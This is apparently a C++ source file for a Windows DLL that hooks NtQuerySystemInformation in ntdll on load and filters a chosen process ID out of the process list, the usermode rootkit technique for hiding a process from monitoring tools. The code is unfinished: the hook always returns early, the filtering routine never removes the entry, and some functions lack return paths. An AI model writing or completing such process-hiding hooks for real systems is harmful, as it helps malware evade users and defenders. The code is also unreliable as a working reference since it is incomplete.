#include "hideEntry.h"
#include <Winternl.h>

//prototype
NTSTATUS WINAPI  qs
(
_In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,
_Inout_   PVOID                    SystemInformation,
_In_      ULONG                    SystemInformationLength,
_Out_opt_ PULONG				   ReturnLength);

SYSTEM_PROCESS_INFORMATION* getNextBufferEntry(SYSTEM_PROCESS_INFORMATION* bufferElem);

//funcptr for original 
typedef NTSTATUS (WINAPI *queryInfos)(
	_In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,
	_Inout_   PVOID                    SystemInformation,
	_In_      ULONG                    SystemInformationLength,
	_Out_opt_ PULONG                   ReturnLength
	);

hideEntry* hider;


BOOL WINAPI DllMain(
	_In_ HINSTANCE hinstDLL,
	_In_ DWORD     fdwReason,
	_In_ LPVOID    lpvReserved
	)
{
	void* queryInfoAddr;
	HMODULE ntdllHandle;

	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		//get the address we want to hook
		ntdllHandle = GetModuleHandle("ntdll.dll");
		queryInfoAddr = GetProcAddress(ntdllHandle, "NtQuerySystemInformation");
		hider = new hideEntry(queryInfoAddr, &qs);
		break;
	case DLL_PROCESS_DETACH:
		delete hider;
		break;
	}

	return TRUE;
}

NTSTATUS WINAPI  qs
(
_In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,
_Inout_   PVOID                    SystemInformation,
_In_      ULONG                    SystemInformationLength,
_Out_opt_ PULONG				   ReturnLength)
{
	HMODULE ntdllHandle;
	queryInfos originalFuncPtr;
	NTSTATUS retCode;
	//restore original function
	hider->deactivateHook();

	ntdllHandle = GetModuleHandle("ntdll.dll");
	originalFuncPtr = (queryInfos)GetProcAddress(ntdllHandle, "NtQuerySystemInformation");

	retCode = originalFuncPtr(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
	//reestablish hook before returning
	hider->activateHook();

	//we are only interested in the 
	if (true || SystemInformationClass != SystemProcessInformation)
	{
		return retCode;
	}

}

//returns 0 if the pid was not found or an error occured,
//otherwise returns the amount of bytes, that is now missing or is no hidden in the buffer
int filterPidFromBuffer(int pidToFilter, SYSTEM_PROCESS_INFORMATION* bufferEntry)
{
	SYSTEM_PROCESS_INFORMATION* prevEntry = nullptr;
	SYSTEM_PROCESS_INFORMATION* currentEntry = nullptr;
	int hiddenBytes;

	if (bufferEntry == nullptr)
		return false;

	currentEntry = bufferEntry;

	while (currentEntry != nullptr)
	{
		//there actually is no difference between a handle and an int here
		if (currentEntry->UniqueProcessId == (HANDLE)pidToFilter)
			break;//found the pid, we want to hide
		//otherwise keep on iterating
		prevEntry = currentEntry;
		currentEntry = getNextBufferEntry(currentEntry);
	}
	if (currentEntry == nullptr)//we did not find the pid to hide
		return 0;

	//now determine where the entry to hide is
	hiddenBytes = currentEntry->NextEntryOffset;
	
	if (prevEntry == nullptr)
	{
		//hiding first entry
	}

}

SYSTEM_PROCESS_INFORMATION* getNextBufferEntry(SYSTEM_PROCESS_INFORMATION* bufferElem)
{
	if (bufferElem == nullptr || bufferElem->NextEntryOffset == 0)//last entry?
		return nullptr;
	return (SYSTEM_PROCESS_INFORMATION*)((byte*)bufferElem + bufferElem->NextEntryOffset);
}